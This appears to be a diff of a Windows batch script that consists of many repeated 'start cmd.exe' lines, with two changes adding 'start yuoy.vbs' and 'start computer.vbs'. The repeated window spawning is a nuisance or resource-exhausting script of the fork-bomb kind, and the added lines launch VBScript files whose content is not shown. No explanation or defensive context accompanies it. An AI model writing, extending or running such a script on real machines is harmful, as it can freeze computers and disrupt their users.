@@ -30,6 +30,7 @@ start cmd.exe
 start cmd.exe
 start cmd.exe
 start cmd.exe
+start yuoy.vbs
 start cmd.exe
 start cmd.exe
 start cmd.exe
@@ -63,8 +64,7 @@ start cmd.exe
 start cmd.exe
 start cmd.exe
 start cmd.exe
-start cmd.exe
-start cmd.exe
+start computer.vbs
 start cmd.exe
 start cmd.exe
 start cmd.exe
